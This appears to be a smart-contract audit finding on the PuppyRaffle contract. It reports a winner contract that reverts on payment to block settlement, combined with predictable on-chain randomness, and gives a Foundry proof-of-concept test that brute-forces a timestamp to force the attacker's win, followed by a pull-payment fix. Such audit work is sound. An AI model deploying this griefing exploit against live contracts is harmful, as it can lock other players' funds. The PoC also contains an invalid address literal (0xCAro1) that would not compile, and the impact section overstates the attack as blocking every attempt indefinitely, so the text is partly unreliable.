selectWinner transfers the prize to an untrusted winner via a low-level call and reverts on failure. A malicious winner contract can always revert in its receive/fallback, causing selectWinner to revert and grief that settlement attempt. Because the winner is derived from abi.encodePacked(msg.sender, block.timestamp, block.difficulty), an attacker can time/select the caller so they are the winner and repeatedly force reverts, delaying raffle finalization.

Vulnerable snippet:

(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

## Impact
A malicious winner contract can make every settlement attempt revert, indefinitely preventing the raffle from finalising. Until a successful draw happens, all ETH contributed by honest players (the entire pot) and the protocol fees remain locked in the contract and no new round can begin. The attack is permissionless and can be repeated at no cost, so liveness of the core user flow (selecting a winner and unlocking the next round) is halted until the contract is upgraded or the code is changed off-chain.

## Proof of Concept
1) Attacker deploys a contract whose receive() reverts on any ETH.
2) Attacker funds the pot by entering at least one slot with the malicious contract address among ≥4 unique players.
3) After duration passes, attacker (or any caller they control) chooses a timestamp/caller such that the RNG selects the malicious address as winner.
4) Calling selectWinner at that time causes the ETH transfer to the winner to revert; require(success) reverts the entire function, blocking settlement for that attempt.
5) The attacker can repeat this at chosen times to repeatedly grief settlement attempts.

## Proof of Code
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AttackWinner {
    receive() external payable {
        revert("NO_PAY");
    }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle raffle;
    uint256 constant TICKET = 1 ether;
    address fee = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(TICKET, fee, 1 days);
    }

    function test_GriefableWinnerRevertsPayout_DoS_selectWinner() public {
        // Prepare entrants with a malicious winner contract
        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        AttackWinner mal = new AttackWinner();
        address carol = address(0xCAro1);

        address[] memory entrants = new address[](4);
        entrants[0] = alice;
        entrants[1] = bob;
        entrants[2] = address(mal);
        entrants[3] = carol;

        // Payer funds the raffle for all entrants
        address payer = address(0xE3);
        vm.deal(payer, 100 ether);
        vm.prank(payer);
        raffle.enterRaffle{value: TICKET * entrants.length}(entrants);

        // Ensure malicious entrant is in slot 2
        assertEq(raffle.players(2), address(mal));

        // Move time past raffle duration
        uint256 base = raffle.raffleStartTime() + raffle.raffleDuration();
        vm.warp(base);

        // Find a timestamp where RNG picks index 2 for a chosen caller
        address settler = address(0xBEEF);
        uint256 targetIndex = 2;
        uint256 foundTs = 0;
        uint256 diff = block.difficulty; // constant in local anvil/foundry by default
        for (uint256 i = 0; i < 3600; i++) {
            uint256 t = base + i + 1; // strictly after duration
            uint256 rnd = uint256(keccak256(abi.encodePacked(settler, t, diff)));
            if (rnd % entrants.length == targetIndex) {
                foundTs = t;
                break;
            }
        }
        assertGt(foundTs, 0);

        // Call selectWinner at the chosen timestamp; payout to malicious winner reverts and bricks this attempt
        vm.warp(foundTs);
        vm.prank(settler);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // State remains unchanged; round still active
        assertEq(raffle.previousWinner(), address(0));
        assertEq(address(raffle).balance, TICKET * entrants.length);
        assertEq(raffle.players(2), address(mal));
    }
}


## Suggested Mitigation
- Use a pull-payment pattern: record owed prizes and let the winner claim later, avoiding reverts that block settlement.

Example fix:

// state
mapping(address => uint256) public pendingPrizes;

function selectWinner() external {
    // ... compute winner, prizePool, update state, mint NFT, etc.
    pendingPrizes[winner] += prizePool; // do not send here
    // no external ETH transfer in settlement path
}

function claimPrize() external {
    uint256 amount = pendingPrizes[msg.sender];
    require(amount > 0, "Nothing to claim");
    pendingPrizes[msg.sender] = 0;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}

- Alternatively, attempt the transfer and on failure credit pendingPrizes[winner] instead of reverting.
- Consider reentrancy guards on claimPrize.


